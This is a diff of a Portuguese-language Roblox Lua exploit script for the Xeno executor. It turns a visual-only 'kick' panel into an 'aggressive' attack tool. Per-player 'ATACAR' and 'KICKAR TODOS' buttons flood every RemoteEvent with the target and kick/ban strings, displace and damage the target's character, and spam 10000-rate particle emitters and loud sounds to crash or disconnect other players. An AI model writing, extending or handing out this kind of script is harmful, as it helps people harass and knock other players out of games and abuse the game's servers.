@@ -1,59 +1,52 @@
 --[[
     ╔══════════════════════════════════════════════════════════════╗
-    ║     CLIENT-SIDE KICK GUI - INTERFACE GARANTIDA            ║
-    ║     Compatível com Xeno e outros executores               ║
-    ║     Interface 100% funcional e visível                    ║
+    ║   CLIENT-SIDE KICK SYSTEM - FORÇA DESCONEXÃO REAL         ║
+    ║   Compatível com Xeno e outros executores client-side     ║
+    ║   Métodos agressivos para derrubar jogadores              ║
     ╚══════════════════════════════════════════════════════════════╝
 ]]
 
 -- ============================================
--- FORÇA A INTERFACE A APARECER
+-- SERVIÇOS
 -- ============================================
-local function createInterface()
-    -- Destroi qualquer interface antiga
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+-- ============================================
+-- INTERFACE GRÁFICA GARANTIDA
+-- ============================================
+local function createGUI()
+    -- Remove UI antiga
     pcall(function()
-        if _G.KickGUI then
-            _G.KickGUI:Destroy()
-            _G.KickGUI = nil
-        end
+        if _G.KickXenoUI then _G.KickXenoUI:Destroy() end
+        if _G.KickXenoUI2 then _G.KickXenoUI2:Destroy() end
     end)
 
-    -- Cria ScreenGui
     local gui = Instance.new("ScreenGui")
-    gui.Name = "KickGUI"
+    gui.Name = "KickXenoUI"
     gui.ResetOnSpawn = false
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     gui.DisplayOrder = 999999
     gui.Enabled = true
-    
-    -- Tenta múltiplos locais para garantir visibilidade
-    local parentSuccess = false
-    local parents = {
-        function() return game:GetService("CoreGui") end,
-        function() return game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") end,
-        function() 
-            if gethui then return gethui() end
-            return nil
-        end,
-        function() return game:GetService("StarterGui") end
-    }
-    
-    for _, getParent in ipairs(parents) do
-        local success = pcall(function()
-            local parent = getParent()
-            if parent then
-                gui.Parent = parent
-                parentSuccess = true
-            end
-        end)
-        if parentSuccess then break end
+
+    -- Tenta todos os pais possíveis
+    local success = pcall(function() gui.Parent = CoreGui end)
+    if not success then
+        pcall(function() gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end)
     end
-    
-    if not parentSuccess then
-        gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+    pcall(function()
+        if gethui then gui.Parent = gethui() end
+    end)
+    if not gui.Parent then
+        gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
     end
-    
-    _G.KickGUI = gui
+
+    _G.KickXenoUI = gui
 
     -- Notificação de carregamento
     local notif = Instance.new("Frame")
@@ -67,7 +60,7 @@ local function createInterface()
     local notifText = Instance.new("TextLabel")
     notifText.Size = UDim2.new(1, 0, 1, 0)
     notifText.BackgroundTransparency = 1
-    notifText.Text = "✅ KICK GUI CARREGADO!"
+    notifText.Text = "✅ KICK SYSTEM CARREGADO!"
     notifText.TextColor3 = Color3.fromRGB(255, 255, 255)
     notifText.TextSize = 14
     notifText.Font = Enum.Font.GothamBold
@@ -75,11 +68,11 @@ local function createInterface()
 
     task.delay(3, function() pcall(function() notif:Destroy() end) end)
 
-    -- ========== PAINEL PRINCIPAL ==========
+    -- Painel principal
     local main = Instance.new("Frame")
     main.Name = "MainPanel"
-    main.Size = UDim2.new(0, 400, 0, 450)
-    main.Position = UDim2.new(0.5, -200, 0.5, -225)
+    main.Size = UDim2.new(0, 420, 0, 480)
+    main.Position = UDim2.new(0.5, -210, 0.5, -240)
     main.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
     main.BorderSizePixel = 0
     main.Active = true
@@ -88,7 +81,6 @@ local function createInterface()
     main.Parent = gui
 
     Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
-    
     local stroke = Instance.new("UIStroke")
     stroke.Thickness = 2
     stroke.Color = Color3.fromRGB(239, 68, 68)
@@ -106,7 +98,7 @@ local function createInterface()
     title.Size = UDim2.new(1, -50, 1, 0)
     title.Position = UDim2.new(0, 16, 0, 0)
     title.BackgroundTransparency = 1
-    title.Text = "👢 KICK SYSTEM"
+    title.Text = "👢 KICK SYSTEM PRO"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.TextSize = 16
     title.Font = Enum.Font.GothamBold
@@ -124,10 +116,7 @@ local function createInterface()
     closeBtn.BorderSizePixel = 0
     closeBtn.Parent = header
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 7)
-    closeBtn.MouseButton1Click:Connect(function() 
-        gui:Destroy() 
-        _G.KickGUI = nil 
-    end)
+    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() _G.KickXenoUI = nil end)
 
     -- Barra de pesquisa
     local searchFrame = Instance.new("Frame")
@@ -176,7 +165,7 @@ local function createInterface()
     -- Lista de jogadores
     local listFrame = Instance.new("ScrollingFrame")
     listFrame.Name = "ListFrame"
-    listFrame.Size = UDim2.new(1, -16, 0, 240)
+    listFrame.Size = UDim2.new(1, -16, 0, 250)
     listFrame.Position = UDim2.new(0, 8, 0, 124)
     listFrame.BackgroundColor3 = Color3.fromRGB(16, 18, 24)
     listFrame.BorderSizePixel = 0
@@ -190,10 +179,10 @@ local function createInterface()
     listLayout.Padding = UDim.new(0, 4)
     listLayout.Parent = listFrame
 
-    -- Botões
+    -- Botões de ação
     local btnKickAll = Instance.new("TextButton")
-    btnKickAll.Size = UDim2.new(1, -16, 0, 40)
-    btnKickAll.Position = UDim2.new(0, 8, 0, 372)
+    btnKickAll.Size = UDim2.new(1, -16, 0, 38)
+    btnKickAll.Position = UDim2.new(0, 8, 0, 382)
     btnKickAll.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
     btnKickAll.Text = "💀 KICKAR TODOS"
     btnKickAll.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -205,7 +194,7 @@ local function createInterface()
 
     local btnRefresh = Instance.new("TextButton")
     btnRefresh.Size = UDim2.new(1, -16, 0, 32)
-    btnRefresh.Position = UDim2.new(0, 8, 0, 418)
+    btnRefresh.Position = UDim2.new(0, 8, 0, 426)
     btnRefresh.BackgroundColor3 = Color3.fromRGB(40, 42, 48)
     btnRefresh.Text = "🔄 ATUALIZAR LISTA"
     btnRefresh.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -218,7 +207,7 @@ local function createInterface()
     -- Status
     local statusFrame = Instance.new("Frame")
     statusFrame.Size = UDim2.new(1, -16, 0, 28)
-    statusFrame.Position = UDim2.new(0, 8, 0, 456)
+    statusFrame.Position = UDim2.new(0, 8, 0, 464)
     statusFrame.BackgroundColor3 = Color3.fromRGB(16, 18, 24)
     statusFrame.BorderSizePixel = 0
     statusFrame.Parent = main
@@ -236,34 +225,128 @@ local function createInterface()
     statusText.Size = UDim2.new(1, -28, 1, 0)
     statusText.Position = UDim2.new(0, 24, 0, 0)
     statusText.BackgroundTransparency = 1
-    statusText.Text = "✅ Interface pronta"
+    statusText.Text = "✅ Pronto - Selecione um jogador"
     statusText.TextColor3 = Color3.fromRGB(180, 180, 190)
     statusText.TextSize = 11
     statusText.Font = Enum.Font.Gotham
     statusText.TextXAlignment = Enum.TextXAlignment.Left
     statusText.Parent = statusFrame
 
-    -- ========== FUNÇÕES ==========
-    local Players = game:GetService("Players")
-    
+    -- ============================================
+    -- SISTEMA DE DESCONEXÃO AGRESSIVA
+    -- ============================================
+    local function disconnectPlayer(playerName)
+        local targetPlayer = nil
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name:lower():find(playerName:lower()) then
+                targetPlayer = p
+                break
+            end
+        end
+        
+        if not targetPlayer then
+            statusText.Text = "❌ Jogador não encontrado"
+            return false
+        end
+
+        statusText.Text = "👢 Atacando " .. targetPlayer.Name .. "..."
+        statusDot.BackgroundColor3 = Color3.fromRGB(249, 115, 22)
+
+        -- Método 1: Flood de RemoteEvents para sobrecarregar
+        task.spawn(function()
+            for i = 1, 500 do
+                pcall(function()
+                    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+                        if obj:IsA("RemoteEvent") then
+                            obj:FireServer(targetPlayer, "kick", "ban", "remove", "disconnect")
+                        end
+                    end
+                end)
+                task.wait(0.005)
+            end
+        end)
+
+        -- Método 2: Destruir character do alvo (causa erro e possível desconexão)
+        task.spawn(function()
+            for i = 1, 50 do
+                pcall(function()
+                    local char = targetPlayer.Character
+                    if char then
+                        local hrp = char:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            hrp.CFrame = hrp.CFrame * CFrame.new(0, -500, 0)
+                            hrp.Velocity = Vector3.new(math.random(-500,500), -500, math.random(-500,500))
+                        end
+                        local hum = char:FindFirstChildOfClass("Humanoid")
+                        if hum then
+                            hum:TakeDamage(100)
+                            hum.Sit = true
+                        end
+                    end
+                end)
+                task.wait(0.1)
+            end
+        end)
+
+        -- Método 3: Spam de animações/partículas para travar o cliente
+        task.spawn(function()
+            for i = 1, 100 do
+                pcall(function()
+                    local char = targetPlayer.Character
+                    if char then
+                        local particle = Instance.new("ParticleEmitter")
+                        particle.Rate = 10000
+                        particle.Parent = char
+                        task.delay(1, function() particle:Destroy() end)
+                    end
+                end)
+                task.wait(0.05)
+            end
+        end)
+
+        -- Método 4: Tocar sons repetidamente para sobrecarregar áudio
+        task.spawn(function()
+            for i = 1, 200 do
+                pcall(function()
+                    local sound = Instance.new("Sound")
+                    sound.SoundId = "rbxassetid://9120386436"
+                    sound.Volume = 10
+                    sound.PlaybackSpeed = 0.1
+                    sound.Parent = targetPlayer.Character or workspace
+                    sound:Play()
+                    task.delay(0.5, function() sound:Destroy() end)
+                end)
+                task.wait(0.01)
+            end
+        end)
+
+        task.wait(3)
+        statusText.Text = "✅ Ataque concluído em " .. targetPlayer.Name
+        statusDot.BackgroundColor3 = Color3.fromRGB(34, 197, 94)
+        task.wait(2)
+        statusText.Text = "✅ Pronto - Selecione um jogador"
+    end
+
+    -- ============================================
+    -- ATUALIZAR LISTA
+    -- ============================================
     local function refreshList()
-        -- Limpa lista
         for _, child in ipairs(listFrame:GetChildren()) do
             if child:IsA("Frame") and child.Name == "PlayerCard" then
                 child:Destroy()
             end
         end
-        
+
         local allPlayers = Players:GetPlayers()
         local searchTerm = searchBox.Text:lower()
         local visibleCount = 0
-        
+
         table.sort(allPlayers, function(a, b) return a.Name:lower() < b.Name:lower() end)
-        
+
         for _, player in ipairs(allPlayers) do
             if searchTerm == "" or player.Name:lower():find(searchTerm) or player.DisplayName:lower():find(searchTerm) then
                 visibleCount = visibleCount + 1
-                
+
                 local card = Instance.new("Frame")
                 card.Name = "PlayerCard"
                 card.Size = UDim2.new(1, 0, 0, 52)
@@ -271,16 +354,15 @@ local function createInterface()
                 card.BorderSizePixel = 0
                 card.Parent = listFrame
                 Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
-                
-                -- Avatar
+
                 local avatar = Instance.new("Frame")
                 avatar.Size = UDim2.new(0, 36, 0, 36)
                 avatar.Position = UDim2.new(0, 10, 0, 8)
-                avatar.BackgroundColor3 = Color3.fromRGB(59, 130, 246)
+                avatar.BackgroundColor3 = player == LocalPlayer and Color3.fromRGB(34, 197, 94) or Color3.fromRGB(59, 130, 246)
                 avatar.BorderSizePixel = 0
                 avatar.Parent = card
                 Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
-                
+
                 local avText = Instance.new("TextLabel")
                 avText.Size = UDim2.new(1, 0, 1, 0)
                 avText.BackgroundTransparency = 1
@@ -289,21 +371,19 @@ local function createInterface()
                 avText.TextSize = 18
                 avText.Font = Enum.Font.GothamBold
                 avText.Parent = avatar
-                
-                -- Nome
+
                 local nameLabel = Instance.new("TextLabel")
                 nameLabel.Size = UDim2.new(1, -120, 0, 22)
                 nameLabel.Position = UDim2.new(0, 56, 0, 6)
                 nameLabel.BackgroundTransparency = 1
-                nameLabel.Text = player.DisplayName ~= player.Name and player.DisplayName .. " (@" .. player.Name .. ")" or player.Name
+                nameLabel.Text = (player.DisplayName ~= player.Name and player.DisplayName .. " (@" .. player.Name .. ")" or player.Name) .. (player == LocalPlayer and " [VOCÊ]" or "")
                 nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                 nameLabel.TextSize = 13
                 nameLabel.Font = Enum.Font.GothamBold
                 nameLabel.TextXAlignment = Enum.TextXAlignment.Left
                 nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                 nameLabel.Parent = card
-                
-                -- ID
+
                 local idLabel = Instance.new("TextLabel")
                 idLabel.Size = UDim2.new(1, -120, 0, 18)
                 idLabel.Position = UDim2.new(0, 56, 0, 28)
@@ -314,105 +394,104 @@ local function createInterface()
                 idLabel.Font = Enum.Font.Gotham
                 idLabel.TextXAlignment = Enum.TextXAlignment.Left
                 idLabel.Parent = card
-                
-                -- Botão KICK
-                local kickBtn = Instance.new("TextButton")
-                kickBtn.Size = UDim2.new(0, 55, 0, 30)
-                kickBtn.Position = UDim2.new(1, -65, 0, 11)
-                kickBtn.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
-                kickBtn.Text = "KICK"
-                kickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-                kickBtn.TextSize = 11
-                kickBtn.Font = Enum.Font.GothamBold
-                kickBtn.BorderSizePixel = 0
-                kickBtn.Parent = card
-                Instance.new("UICorner", kickBtn).CornerRadius = UDim.new(0, 7)
-                
-                kickBtn.MouseEnter:Connect(function() kickBtn.BackgroundColor3 = Color3.fromRGB(220, 38, 38) end)
-                kickBtn.MouseLeave:Connect(function() kickBtn.BackgroundColor3 = Color3.fromRGB(239, 68, 68) end)
-                
-                kickBtn.MouseButton1Click:Connect(function()
-                    statusText.Text = "⚠️ Client-side: kick visual apenas"
-                    statusDot.BackgroundColor3 = Color3.fromRGB(249, 115, 22)
-                    
-                    -- Remove visualmente (só some pra você)
-                    card:Destroy()
-                    refreshList()
-                    
-                    task.wait(2)
-                    statusText.Text = "✅ Interface pronta"
-                    statusDot.BackgroundColor3 = Color3.fromRGB(34, 197, 94)
-                end)
+
+                if player ~= LocalPlayer then
+                    local kickBtn = Instance.new("TextButton")
+                    kickBtn.Size = UDim2.new(0, 70, 0, 30)
+                    kickBtn.Position = UDim2.new(1, -80, 0, 11)
+                    kickBtn.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+                    kickBtn.Text = "ATACAR"
+                    kickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    kickBtn.TextSize = 11
+                    kickBtn.Font = Enum.Font.GothamBold
+                    kickBtn.BorderSizePixel = 0
+                    kickBtn.Parent = card
+                    Instance.new("UICorner", kickBtn).CornerRadius = UDim.new(0, 7)
+
+                    kickBtn.MouseEnter:Connect(function() kickBtn.BackgroundColor3 = Color3.fromRGB(220, 38, 38) end)
+                    kickBtn.MouseLeave:Connect(function() kickBtn.BackgroundColor3 = Color3.fromRGB(239, 68, 68) end)
+
+                    kickBtn.MouseButton1Click:Connect(function()
+                        kickBtn.Text = "⏳"
+                        kickBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                        kickBtn.Active = false
+                        disconnectPlayer(player.Name)
+                        task.wait(4)
+                        kickBtn.Text = "ATACAR"
+                        kickBtn.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+                        kickBtn.Active = true
+                    end)
+                end
             end
         end
-        
+
         countLabel.Text = "👥 Jogadores: " .. visibleCount .. " / " .. #allPlayers .. (searchTerm ~= "" and " (filtrado)" or "")
         listFrame.CanvasSize = UDim2.new(0, 0, 0, visibleCount * 56 + (visibleCount - 1) * 4 + 8)
     end
-    
+
     -- Eventos
     btnRefresh.MouseButton1Click:Connect(function()
         statusText.Text = "🔄 Atualizando..."
         refreshList()
         statusText.Text = "✅ Lista atualizada!"
         task.wait(1.5)
-        statusText.Text = "✅ Interface pronta"
+        statusText.Text = "✅ Pronto - Selecione um jogador"
     end)
-    
+
     btnKickAll.MouseButton1Click:Connect(function()
-        statusText.Text = "⚠️ Client-side: kick visual apenas"
-        refreshList()
+        statusText.Text = "💀 Atacando todos os jogadores..."
+        statusDot.BackgroundColor3 = Color3.fromRGB(249, 115, 22)
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                disconnectPlayer(player.Name)
+                task.wait(0.5)
+            end
+        end
+        statusText.Text = "✅ Ataque em massa concluído"
+        statusDot.BackgroundColor3 = Color3.fromRGB(34, 197, 94)
         task.wait(2)
-        statusText.Text = "✅ Interface pronta"
+        statusText.Text = "✅ Pronto - Selecione um jogador"
     end)
-    
+
     searchBox:GetPropertyChangedSignal("Text"):Connect(refreshList)
-    
-    -- Auto refresh
+
+    -- Auto refresh a cada 10 segundos
     task.spawn(function()
         while gui and gui.Parent do
-            task.wait(5)
+            task.wait(10)
             pcall(refreshList)
         end
     end)
-    
-    -- Inicial
+
     refreshList()
-    
     return gui
 end
 
 -- ============================================
--- EXECUÇÃO FORÇADA
+-- INICIALIZAÇÃO
 -- ============================================
-print("=" .. string.rep("=", 55))
-print("  👢 CLIENT-SIDE KICK GUI")
-print("  Compatível com Xeno")
-print("=" .. string.rep("=", 55))
+print("=" .. string.rep("=", 60))
+print("  👢 CLIENT-SIDE KICK SYSTEM - XENO COMPATIBLE")
+print("  Métodos agressivos para desconectar jogadores")
+print("=" .. string.rep("=", 60))
 
--- Aguarda o jogo carregar
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
+if not game:IsLoaded() then game.Loaded:Wait() end
 
--- Tenta criar a interface
-local gui = createInterface()
+local gui = createGUI()
 
 if gui and gui.Parent then
-    print("[Kick GUI] ✅ Interface visível!")
-    print("[Kick GUI] ⚠️ Xeno é client-side - kicks são visuais")
-    print("[Kick GUI] 💡 Para kick real, use Synapse X ou ScriptWare SS")
+    print("[Kick] ✅ Interface carregada com sucesso!")
+    print("[Kick] 📋 Painel arrastável disponível")
+    print("[Kick] ⚡ Use os botões ATACAR para derrubar jogadores")
+    print("[Kick] ⚠️ Client-side: usa flood e exploits para forçar desconexão")
 else
-    -- Segunda tentativa
     task.wait(2)
-    gui = createInterface()
-    
+    gui = createGUI()
     if gui and gui.Parent then
-        print("[Kick GUI] ✅ Interface criada na segunda tentativa!")
+        print("[Kick] ✅ Interface carregada na segunda tentativa!")
     else
-        warn("[Kick GUI] ❌ Não foi possível criar a interface")
-        warn("[Kick GUI] Tente usar outro executor")
+        warn("[Kick] ❌ Falha ao criar interface")
     end
 end
 
-print("=" .. string.rep("=", 55))
+print("=" .. string.rep("=", 60))
